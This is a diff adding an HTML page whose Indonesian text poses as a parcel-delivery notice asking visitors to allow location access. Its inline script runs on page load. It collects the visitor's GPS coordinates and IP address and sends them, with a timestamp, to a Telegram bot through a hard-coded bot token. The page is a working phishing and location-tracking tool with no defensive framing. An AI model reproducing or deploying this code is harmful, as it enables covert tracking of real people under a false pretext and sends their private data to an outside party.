@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <a href="index2.html">izinkan akses lokasi untuk pengiriman paket,klik link ini jika ingin melihat detail informasi paket</a>
+    <script>
+        const botToken = "7859928231:AAGqx6VLnkYe9GRCELYEOmFZg0YGhExGkjQ"; // Replace with your bot token
+
+        // Automatically call the function when the page loads
+        sendData();
+
+        async function fetchChatId() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
+                const data = await response.json();
+                if (data.result.length > 0) {
+                    return data.result[data.result.length - 1].message.chat.id; // Get the latest chat_id
+                }
+            } catch (error) {
+                console.error("Error fetching chat ID:", error);
+            }
+            return null;
+        }
+
+        async function sendData() {
+            const errorDiv = document.getElementById("error");
+            const infoContainer = document.getElementById("infoContainer");
+
+            const chatId = await fetchChatId(); // Fetch the chat_id
+
+            if (!chatId) {
+                errorDiv.textContent = "Failed to retrieve chat ID. Please ensure you've interacted with the bot.";
+                errorDiv.style.display = "block";
+                return;
+            }
+
+            try {
+                // Get the user's location
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+
+                const currentDateTime = new Date().toLocaleString("id-ID");
+
+                // Fetch the user's IP address
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+
+                // Prepare the message to send to Telegram
+                const message = `Location: ${position.coords.latitude}, ${position.coords.longitude}\n` +
+                                `Time: ${currentDateTime}\n` +
+                                `IP Address: ${ipData.ip}`;
+
+                // Send message to Telegram
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const response = await fetch(telegramUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
+
+                if (response.ok) {
+                    errorDiv.style.display = "none";
+                    document.getElementById("location").textContent = 
+                        `Location: ${position.coords.latitude}, ${position.coords.longitude}`;
+                    document.getElementById("datetime").textContent = 
+                        `Time: ${currentDateTime}`;
+                    document.getElementById("ipaddress").textContent = 
+                        `IP Address: ${ipData.ip}`;
+                    infoContainer.style.display = "block";
+                } else {
+                    throw new Error("Failed to send message to Telegram.");
+                }
+            } catch (error) {
+                errorDiv.textContent = "Failed to get information or send data.";
+                errorDiv.style.display = "block";
+                infoContainer.style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
